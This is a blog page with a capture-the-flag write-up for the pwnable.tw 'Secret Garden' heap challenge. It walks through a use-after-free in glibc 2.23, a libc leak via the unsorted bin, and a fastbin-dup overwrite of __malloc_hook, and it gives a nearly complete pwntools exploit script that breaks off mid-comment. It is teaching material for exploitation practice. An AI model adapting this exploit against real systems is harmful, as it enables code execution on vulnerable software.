@@ -1,0 +1,628 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="" href="https://aesophor.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="" href="https://aesophor.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="" href="https://aesophor.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="linux,ctf,binary-exploitation" />
+
+
+<link rel="canonical" href="https://aesophor.github.io/2022/08/27/pwnable-tw-secret-garden/">
+
+
+
+  <title>
+[pwnable.tw] Secret Garden (350 pts) - CTF |
+aesophor =  = software, adventures, and thoughts</title>
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">[pwnable.tw] Secret Garden (350 pts)
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2022-08-27 14:06:00">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2022-08-27T14:06:00+08:00">2022-08-27</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">aesophor</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+          <img src="/2022/08/27/pwnable-tw-secret-garden/banner.png">
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF/" itemprop="item" rel="index" title="In CTF"><span itemprop="name">CTF</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="https://aesophor.github.io/2022/08/27/pwnable-tw-secret-garden/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="aesophor">
+    <meta itemprop="description" content="software, adventures, and thoughts, {software,reverse} engineer">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <p><img data-src="banner.png" alt="banner"></p>
+<h1 id="introduction"><a class="markdownIt-Anchor" href="#introduction">#</a> Introduction</h1>
+<p>Let’s solve the heap exploitation challenge, <strong><span class="exturl" data-url="aHR0cHM6Ly9wd25hYmxlLnR3L2NoYWxsZW5nZS8jMTI=">Secret Garden [350 pts]</span></strong> (x86_64, glibc 2.23). In summary:</p>
+<ul>
+<li>Free a large chunk into the unsorted bin.</li>
+<li>The  <code>fd</code>  field of the freed chunk in the unsorted bin contains a libc address whose offset within libc is a fixed value.</li>
+<li>Visit the garden and leak the libc base to stdout.</li>
+<li>Overwrite  <code>__malloc_hook</code>  with a one gadget using fastbin dup.</li>
+<li>Trigger our  <code>__malloc_hook</code>  via  <code>malloc_printerr()</code> .</li>
+</ul>
+<h1 id="analysis"><a class="markdownIt-Anchor" href="#analysis">#</a> Analysis</h1>
+<p>Sounds easy enough, eh? This challenge is perfect for someone who’s new to heap exploitation, as it allows us to learn how fastbin dup works, and overall it’s not too complicated. Okay, enough talk, let’s get started. Running the binary shows the following output:</p>
+<pre><code>☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆
+☆          Secret Garden          ☆
+☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆
+
+  1 . Raise a flower
+  2 . Visit the garden
+  3 . Remove a flower from the garden
+  4 . Clean the garden
+  5 . Leave the garden
+
+Your choice :
+</code></pre>
+<p>Only the first three options are required for exploitation:</p>
+<ol>
+<li>Raise a flower:
+<ul>
+<li>malloc() twice.</li>
+<li>The first malloc(0x28) allocates a flower struct.</li>
+<li>The second malloc() allows us to specify the size.
+<ul>
+<li>Then it calls read() to let us edit the chunk’s user data.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Visit the garden:
+<ul>
+<li>Print all the flowers’s data.</li>
+</ul>
+</li>
+<li>Remove a flower from the garden (by index):
+<ul>
+<li>Clear the flower struct’s first QWORD (i.e.  <code>fd</code>  field)</li>
+<li>free() the flower but doesn’t set it to NULL.</li>
+</ul>
+</li>
+</ol>
+<h1 id="preparation"><a class="markdownIt-Anchor" href="#preparation">#</a> Preparation</h1>
+<p>I suggest using <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NreXNpZGVyL3B3bmRvY2tlcg==">pwndocker</span>, since it allows you to switch between different versions of glibc in a breeze, and all the commonly-used exploitation tools are already provided in the container.</p>
+<ul>
+<li>Patching ELF</li>
+</ul>
+<pre><code># patchelf --set-interpreter /glibc/2.23/64/lib/ld-2.23.so ./heap_paradise
+# ldd ./secretgarden
+        linux-vdso.so.1 (0x00007fffcb2f7000)
+        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f0f13c8b000)
+        /glibc/2.23/64/lib/ld-2.23.so =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f0f1408b000)
+</code></pre>
+<ul>
+<li>To run  <code>secretgarden</code>  locally with glibc 2.23 (stripped):</li>
+</ul>
+<pre><code># LD_PRELOAD=./libc.so.6 ./secretgarden
+</code></pre>
+<ul>
+<li>To run  <code>secretgarden</code>  locally with glibc 2.23 (non-stripped):</li>
+</ul>
+<pre><code># ./secretgarden
+</code></pre>
+<blockquote>
+<p>Note:<br>
+The non-stripped version of glibc should only be used during exploit script developement. You’ll finally need to switch over to the stripped version which comes with the challenge, because they have different offsets for symbols.</p>
+</blockquote>
+<h1 id="vulnerability"><a class="markdownIt-Anchor" href="#vulnerability">#</a> Vulnerability</h1>
+<p>The third option, “remove a flower from the garden”, contains an obvious UAF vulnerability, as it doesn’t set the freed pointer to NULL.</p>
+<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>_DWORD <span class="token operator">*</span>ptrToFdField<span class="token punctuation">;</span> <span class="token comment">// rax</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">unsigned</span> <span class="token keyword">int</span> index<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-14h] BYREF</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  </pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">&lt;=</span> <span class="token number">99</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>ptrToFdField <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>flowers<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0LL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	<span class="token operator">*</span>ptrToFdField <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>flowers<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Successful"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>To reach the crashing state of this program, we only need to raise a flower and remove it twice.</p>
+<pre><code>Your choice : 3
+Which flower do you want to remove from the garden:0
+*** Error in `./secretgarden': double free or corruption (fasttop): 0x0000558b995ae450 ***
+Aborted (core dumped)
+</code></pre>
+<p>With this vulnerability, we can perform fastbin dup by double freeing a flower. Unfortunately, as all the protections (except FORTIFY) are enabled in this challenge, GOT hijacking is not an easy option. We’ll need to find a way to leak libc base and overwrite either  <code>__malloc_hook</code>  or  <code>__free_hook</code>  with the address of an one gadget.</p>
+<pre><code># checksec --file ./secretgarden
+[*] '/ctf/work/pwnable.tw/secret-garden/secretgarden'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    FORTIFY:  Enabled
+</code></pre>
+<h1 id="exploitation"><a class="markdownIt-Anchor" href="#exploitation">#</a> Exploitation</h1>
+<p>Before we begin, let’s pay attention to the first option, “raise a flower”. Remember that it calls malloc() twice, so if we write  <code>chall.create(0x420)</code>  it will:</p>
+<ul>
+<li>malloc(0x28), which returns a 0x30-byte chunk (including the header)</li>
+<li>malloc(0x420), which returns a 0x430-byte chunk (including the header)</li>
+</ul>
+<h2 id="leaking-libc-base"><a class="markdownIt-Anchor" href="#leaking-libc-base">#</a> Leaking libc base</h2>
+<p>We can allocate and free a large chunk (0x420 bytes) into the unsorted bin, and print its  <code>fd</code>  field to stdout.</p>
+<pre><code>chall.create(0x420)
+chall.remove(0)
+chall.visit()
+</code></pre>
+<p><img data-src="bin1.png" alt=""></p>
+<p>Wait, the freed chunk doesn’t go into the unsorted bin! That’s because the large chunk we’ve allocated is next to the top chunk, and when it is freed, it will be merged into the top chunk. To workaround this, simply allocate another small chunk with whatever size other than 0x28.</p>
+<pre><code>chall.create(0x420)
+chall.create(0x38) # new
+chall.remove(0)
+chall.visit()
+</code></pre>
+<p><img data-src="bin2.png" alt=""></p>
+<p>Good. The large chunk now goes into the unsorted bin. To print it via the second option, “visit the garden”, we need to allocate it again and make sure we don’t overwrite the  <code>fd</code>  field.</p>
+<pre><code>chall.create(0x420)
+chall.create(0x38)
+chall.remove(0)
+chall.create(0x420, b'') # new
+chall.visit()
+</code></pre>
+<p><img data-src="bin3.png" alt=""></p>
+<p>Unfortunately, if we choose option 1, it won’t return us the exact same 0x430-byte chunk from before. As we can see, option 1 calls  <code>malloc()</code>  twice, 0x28 and 0x420 respectively. So when the program calls  <code>malloc(0x28)</code> , glibc splits our 0x430-byte free chunk in the unsorted bin into two halves: (1) a 0x30-byte chunk, and (2) a 0x400-byte chunk. This former is returned to the user, while the latter is put into a large bin.</p>
+<p>To workaround this, we need to place a 0x30-byte chunk in a fastbin, so that glibc can return that chunk instead of splitting from our 0x430-byte chunk. As shown below, the  <code>fd</code>  field of the 0x430-byte chunk is successfully leaked to stdout.</p>
+<pre><code>chall.create(0x420)
+chall.create(0x38)
+chall.create(0x28) # new
+chall.remove(2)    # new
+chall.remove(0)
+chall.create(0x420, b'')
+chall.visit()
+</code></pre>
+<pre><code>[*] leaked: 0x7fdad280db0a
+[*] leaked libc_base: 0x7fdad244a000
+</code></pre>
+<p><img data-src="leaked.png" alt=""></p>
+<h2 id="overwriting-__malloc_hooklibc-via-fastbin-dup"><a class="markdownIt-Anchor" href="#overwriting-__malloc_hooklibc-via-fastbin-dup">#</a> Overwriting __malloc_hook@libc via fastbin dup</h2>
+<p>Next, we can use the <strong>fastbin dup</strong> technique to achieve arbitrary write. We need to either:</p>
+<ul>
+<li>overwrite  <code>__malloc_hook@libc</code>  and trigger  <code>malloc()</code> , or</li>
+<li>overwrite  <code>__free_hook@libc</code>  and trigger  <code>free()</code></li>
+</ul>
+<p>Let’s try to bypass the infamous “double free or corruption (fasttop)” error with the ABA pattern [<a href="#check-1-double-free-or-corruption-fasttop">1</a>].</p>
+<pre><code>chall.create(0x68)
+chall.create(0x68)
+chall.remove(4)
+chall.remove(5)
+chall.remove(4)
+</code></pre>
+<p><img data-src="bin4.png" alt=""></p>
+<p>Good. We now have two overlapping (same) chunks in the same fastbin. Now we can overwrite the  <code>fd</code>  field of this chunk.</p>
+<pre><code>chall.create(0x68)
+chall.create(0x68)
+chall.remove(4)
+chall.remove(5)
+chall.remove(4)
+chall.create(0x68, p64(libc_base + libc.sym['__free_hook']))
+chall.create(0x68)
+chall.create(0x68)
+chall.create(0x68, p64(libc_base + one_gadget))
+</code></pre>
+<p><img data-src="bin5.png" alt=""></p>
+<p>Okay, here’s another restriction we need to bypass. In glibc,  <code>malloc()</code>  will refuse to return a freed chunk from a fastbin if that chunk’s  <code>size</code>  field is incorrect [<a href="#check-2-malloc-memory-corruption-fast">2</a>].</p>
+<pre><code>Error in `/ctf/work/pwnable.tw/secret-garden/secretgarden': malloc(): memory corruption (fast): 0x00007efdb9063b20 ***
+</code></pre>
+<p>To bypass this, we need to rethink where we’re trying to write data into. The answer is  <code>__malloc_hook</code>  or  <code>__free_hook</code> , right? Let’s take a look at that memory region.</p>
+<p><img data-src="hooks.png" alt=""></p>
+<p><img data-src="7f.png" alt=""></p>
+<p>All the bytes near  <code>__free_hook</code>  are all NULL bytes, so it’s not easy to be overwritten with fastbin dup. However, there’s a sequence of bytes “7f 00 00 00 00 00 00 00” before  <code>__malloc_hook</code> . If we use these bytes as the free chunk’s  <code>size</code>  field, then we’ll get a 0x70-byte free chunk, and this is enough for us to overwrite  <code>__malloc_hook</code> .</p>
+<pre><code>chall.create(0x68)
+chall.create(0x68)
+chall.remove(4)
+chall.remove(5)
+chall.remove(4)
+chall.create(0x68, p64(libc_base + libc.sym['__malloc_hook'] - 35))
+chall.create(0x68)
+chall.create(0x68)
+chall.create(0x68, 19 * b'A' + p64(libc_base + one_gadget))
+chall.create(0x68) # trigger __malloc_hook
+</code></pre>
+<h2 id="triggering-our-__malloc_hook"><a class="markdownIt-Anchor" href="#triggering-our-__malloc_hook">#</a> Triggering our __malloc_hook</h2>
+<p>The last thing that will probably annoy you is that the constraints of all four one gadgets are unsatisfiable when  <code>__malloc_hook</code>  is triggered via option 1, “raise a flower”.</p>
+<p><img data-src="one_gadget.png" alt=""></p>
+<p>Fortunately, there’s another way to trigger  <code>__malloc_hook</code> : via  <code>malloc_printerr()</code> . This function is used to print error message when  <code>malloc()</code>  and  <code>free()</code>  fails, and most importantly, it calls  <code>malloc()</code> . Now back to our question, the easiest way to invoke  <code>malloc_printerr()</code>  is to create a “double free or corruption (fasttop)” error [<a href="#check-1-double-free-or-corruption-fasttop">1</a>] on purpose.</p>
+<pre><code>chall.create(0x68)
+chall.create(0x68)
+chall.remove(4)
+chall.remove(5)
+chall.remove(4)
+chall.create(0x68, p64(libc_base + libc.sym['__malloc_hook'] - 35))
+chall.create(0x68)
+chall.create(0x68)
+
+# Prepare a chunk for (fasttop) error
+chall.create(0x48)
+
+# Overwrite __malloc_hook.
+chall.create(0x68, 19 * b'A' + p64(libc_base + one_gadget))
+
+# Trigger &quot;double free or corruption (fasttop)&quot;.
+chall.remove(9)
+chall.remove(9)
+</code></pre>
+<h1 id="full-exploit-script"><a class="markdownIt-Anchor" href="#full-exploit-script">#</a> Full Exploit Script</h1>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/env python3</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># -*- encoding: utf-8 -*-</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="5"></td><td><pre>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>elf  <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./secretgarden'</span><span class="token punctuation">,</span> checksec <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc_64.so.6'</span><span class="token punctuation">,</span> checksec <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>one_gadget <span class="token operator">=</span> <span class="token number">0xef6c4</span></pre></td></tr><tr><td data-num="10"></td><td><pre>A8 <span class="token operator">=</span> <span class="token number">7</span> <span class="token operator">*</span> <span class="token string">b'A'</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">Challenge</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> proc<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        self<span class="token punctuation">.</span>proc <span class="token operator">=</span> proc</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> len_name<span class="token punctuation">,</span> name <span class="token operator">=</span> A8<span class="token punctuation">,</span> color <span class="token operator">=</span> A8<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token triple-quoted-string string">""" malloc(0x28), malloc(len_name) """</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        self<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice : '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        self<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'name :'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>len_name<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        self<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'of flower :'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        self<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'the flower :'</span><span class="token punctuation">,</span> color<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">visit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        self<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice : '</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">remove</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        self<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice : '</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        self<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'garden:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">cleanup</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        self<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice : '</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    proc <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'chall.pwnable.tw'</span><span class="token punctuation">,</span> <span class="token number">10203</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre>    chall <span class="token operator">=</span> Challenge<span class="token punctuation">(</span>proc<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token comment"># Prepare a large chunk.</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    chall<span class="token punctuation">.</span>create<span class="token punctuation">(</span><span class="token number">0x420</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token comment"># Prevents the large chunk from being merged into the top chunk.</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    chall<span class="token punctuation">.</span>create<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre></pre></td></tr><tr><td data-num="44"></td><td><pre>    <span class="token comment"># Prevents the 0x430-byte chunk from being split.</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    chall<span class="token punctuation">.</span>create<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    chall<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token comment"># Free the 0x430-byte chunk into unsorted bin.</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    chall<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre></pre></td></tr><tr><td data-num="51"></td><td><pre>    <span class="token comment"># Allocate the 0x430-byte chunk again so that visit() can print it.</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    chall<span class="token punctuation">.</span>create<span class="token punctuation">(</span><span class="token number">0x420</span><span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">,</span> <span class="token string">b'A'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="53"></td><td><pre></pre></td></tr><tr><td data-num="54"></td><td><pre>    chall<span class="token punctuation">.</span>visit<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre></pre></td></tr><tr><td data-num="56"></td><td><pre>    proc<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'flower[3] :'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="57"></td><td><pre>    leaked <span class="token operator">=</span> u64<span class="token punctuation">(</span>proc<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="58"></td><td><pre>    offset <span class="token operator">=</span> <span class="token number">0x7fb7dafc4b0a</span> <span class="token operator">-</span> <span class="token number">0x7fb7dac01000</span></pre></td></tr><tr><td data-num="59"></td><td><pre>    libc_base <span class="token operator">=</span> leaked <span class="token operator">-</span> offset</pre></td></tr><tr><td data-num="60"></td><td><pre>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'leaked libc_base: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="61"></td><td><pre></pre></td></tr><tr><td data-num="62"></td><td><pre>    <span class="token comment"># Overwrite __malloc_hook with one gadget using fastbin dup.</span></pre></td></tr><tr><td data-num="63"></td><td><pre>    chall<span class="token punctuation">.</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="64"></td><td><pre>    chall<span class="token punctuation">.</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="65"></td><td><pre>    chall<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="66"></td><td><pre>    chall<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="67"></td><td><pre>    chall<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="68"></td><td><pre>    chall<span class="token punctuation">.</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">35</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="69"></td><td><pre>    chall<span class="token punctuation">.</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="70"></td><td><pre>    chall<span class="token punctuation">.</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="71"></td><td><pre></pre></td></tr><tr><td data-num="72"></td><td><pre>    <span class="token comment"># Trigger __malloc_hook.</span></pre></td></tr><tr><td data-num="73"></td><td><pre>    <span class="token comment"># It seems that raising a flower will cause 